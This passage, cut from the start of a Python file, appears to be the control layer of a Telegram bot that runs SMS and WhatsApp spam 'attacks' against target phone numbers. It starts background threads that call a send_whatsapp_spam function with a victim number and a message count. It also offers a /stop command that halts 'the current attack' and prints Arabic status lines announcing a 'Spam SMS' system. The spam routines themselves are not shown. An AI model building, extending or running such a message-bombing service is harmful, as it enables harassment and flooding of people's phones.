    thread = threading.Thread(target=send_whatsapp_spam, args=(chat_id, number, whatsapp_count))
    thread.start()

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    chat_id = message.chat.id
    
    if chat_id in user_sessions:
        user_sessions[chat_id]['active'] = False
        bot.send_message(chat_id, "🛑 تم إيقاف الهجوم الحالي.")
    else:
        bot.send_message(chat_id, "ℹ️ لا يوجد هجوم نشط لإيقافه.")

@bot.message_handler(func=lambda message: True)
def handle_other_messages(message):
    chat_id = message.chat.id
    
    if not check_subscription(chat_id):
        send_welcome(message)
        return
        
    bot.reply_to(message, "❓ أمر غير معروف! استخدم /help للمساعدة.")

def start_auto_system():
    """بدء النظام التلقائي الذكي"""
    print(f"{GREEN}🚀 بدء تشغيل النظام الذكي لـ Spam SMS...{RESET_COLOR}")
    
    master_manager = AutoMasterManager()
    
    if master_manager.start_auto_master():
        monitor_thread = threading.Thread(target=master_manager.monitor_and_switch)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        print(f"{GREEN}✅ النظام الذكي يعمل وجاهز!{RESET_COLOR}")
        return master_manager
    else:
        print(f"{GREEN}✅ النظام يعمل في الوضع العادي{RESET_COLOR}")
        return True

def start_telegram_bot():
    """تشغيل بوت التلجرام في الخلفية"""
    try:
        print(f"{CYAN}📱 جاري تشغيل بوت التلجرام...{RESET_COLOR}")
        bot.infinity_polling()
    except Exception as e:
        print(f"{YELLOW}⚠️  بوت التلجرام متوقف: {e}{RESET_COLOR}")

if __name__ == "__main__":
    # بدء النظام التلقائي
    system_ready = start_auto_system()
    
    if system_ready:
        # تشغيل بوت التلجرام في thread منفصل
        telegram_thread = threading.Thread(target=start_telegram_bot, daemon=True)
        telegram_thread.start()
        
        # تشغيل الواجهة التلقائية في التيرمنال
        start_terminal_interface()
